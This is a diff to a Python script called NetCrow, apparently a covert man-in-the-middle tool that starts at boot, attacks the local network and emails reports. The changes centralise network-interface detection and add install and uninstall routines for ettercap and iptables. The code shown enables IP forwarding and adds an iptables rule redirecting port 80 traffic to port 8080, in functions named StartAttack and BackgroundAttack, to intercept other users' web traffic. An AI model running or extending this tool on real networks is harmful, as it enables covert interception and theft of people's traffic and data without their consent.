@@ -26,6 +26,8 @@ InfTime = 12			# Every SaveDelay * InfTime [Sec] --> New Information Mail
 				# --> NetCrow runs by default 30min or 1800sek
 FinishExecution = "reboot"	# Possible "reboot" "shutdown" "stay" - Standart "reboot"
 
+interface = ""
+
 nettest = 0
 SendBoot = 0
 BootBol = 0 
@@ -46,6 +48,16 @@ bold = '\033[1m'
 under = '\033[4m'
 
 
+# Define Interface
+
+if interface == "":
+	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
+	interface_get = os.popen(interface_comm).read()
+	interface = interface_get[0:4]
+	if interface == "wlan":
+		interface = "wlan0"
+
+
 # Define Main Function
 
 def BootingAttack():
@@ -58,10 +70,6 @@ def BootingAttack():
 	except:
         	ErrSub = "Starting the Atttack FAILED"
         try:
-		interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
-		interface_get = os.popen(interface_comm).read()
-		UpTimeTemp = GetUpTime()
-		interface = interface_get[0:4]
 		ErrText = "Connection to Internet               Yes \nConnection to Network via " + interface + "\nUptime                             " + UpTimeTemp
         except:
 		ErrText = "Connection to Internet               Yes \nConnection to Network             No" + "\nUptime                            " + UpTimeTemp
@@ -86,11 +94,7 @@ def SendBootUp():
 	Time = (datetime.datetime.now()).strftime("%H:%M:%S")
 	Date = time.strftime("%d/%m/%Y")
 	Sub = "NetCrow has started working at " + Time + " the " + Date + " !!!" 
-	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
-        interface_get = os.popen(interface_comm).read()
-        interface = interface_get[0:4]
-	if interface == "wlan":
-                interface = "wlan0"
+
 	# Get IP Adress
 	ipaddress_comm = "hostname -I"
 	ipaddress_get = os.popen(ipaddress_comm).read()
@@ -100,13 +104,6 @@ def SendBootUp():
 	
 def StartAttack():
 	
-	# Set up Interface String
-	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
-	interface_get = os.popen(interface_comm).read()
-	interface = interface_get[0:4]
-	if interface == "wlan":
-		interface = "wlan0"
-		
 	# Set up Environment
 	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") 
 	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080") 
@@ -242,13 +239,6 @@ def AutoStartDis():
 	
 def AttackOnly():
 	
-	# Set up Interface String
-	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
-	interface_get = os.popen(interface_comm).read()
-	interface = interface_get[0:4]
-	if interface == "wlan":
-		interface = "wlan0"
-		
 	# Set up Environment
 	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
@@ -265,13 +255,6 @@ def AttackOnly():
 		
 def BackgroundAttack():
 	
-	# Set up Interface String
-	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
-	interface_get = os.popen(interface_comm).read()
-	interface = interface_get[0:4]
-	if interface == "wlan":
-		interface = "wlan0"
-		
 	# Set up Environment
 	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
@@ -306,17 +289,48 @@ def PrintHelp():
 	print green + under +  "		NETCROW - BY RASPBERRYY" + white	
 	print ""
 	print "	Command List:"
-	print "	 -a             Start Attack manually"
-	print "	 -b             Start Attack in Background"
-	print "	 -d             Delete Backups in Logging"	
-	print "	 -h --help	Prints this"	
-	print "	 -s             Prevent NetCrow Start Message"
-	print "	 -t		Send Test E-Mail"
+	print "	 -a             	Start Attack manually"
+	print "	 -b             	Start Attack in Background"
+	print "	 -d             	Delete Backups in Logging"	
+	print "	 -h --help		Prints this"	
+	print "	 -s            	 Prevent NetCrow Start Message"
+	print "	 -t			Send Test E-Mail"
 	print "	 --AutoStart-enable     Enable automatical Boot"
         print "	 --AutoStart-disable    Disable automatical Boot"
+	print "	 -install 		Install NetCrow"
+	print "	 -uninstall		Remove Netcrow"
 	print ""
 
 
+	
+def Install():
+	print yell + "[*]" + white + " Installing ZLib"
+	os.system("sudo apt-get install zlib1g zlib1g-dev -y")
+	print yell + "[*]" + white + " Installing Build-Essential"
+	os.system("sudo apt-get install build-essential -y")
+	print yell + "[*]" + white + " Installing Ettercap"
+	os.system("sudo apt-get install ettercap -y")
+	os.system("sudo apt-get update")
+	os.system("sudo apt-get install ettercap-text-only -y")
+		
+	# Install Ip-Tables
+	print yell + "[*]" + white + " Installing Ip-Tables-Dev"
+	os.system("apt-get install iptables-dev")
+
+
+	
+def Uninstall():
+	print red + "[!]" + white + " Removing ZLib"
+	os.system("sudo apt-get remove zlib1g zlib1g-dev -y")
+	print red + "[!]" + white + " Removing Build-Essential"
+	os.system("sudo apt-get remove build-essential -y")
+	print red + "[!]" + white + " Removing Ettercap"
+	os.system("sudo apt-get remove ettercap -y")
+	os.system("sudo apt-get remove ettercap-text-only -y")
+	
+	# remove Ip-Tables
+	print red + "[!]" + white + " Removing IpTables-Dev"
+	os.system("apt-get remove iptables-dev")
 
 
 # Main Program - Test for Commands
@@ -385,6 +399,20 @@ elif sys.argv[1]=="-d":
         BootBol = 1
 elif sys.argv[2]=="-d":
         DeleteBackup()
+        BootBol = 1
+		
+elif sys.argv[1]=="-install":
+        Install()
+        BootBol = 1
+elif sys.argv[2]=="-install":
+        Install()
+        BootBol = 1
+		
+elif sys.argv[1]=="-uninstall":
+        Uninstall()
+        BootBol = 1
+elif sys.argv[2]=="-uninstall":
+        Uninstall()
         BootBol = 1
         
 
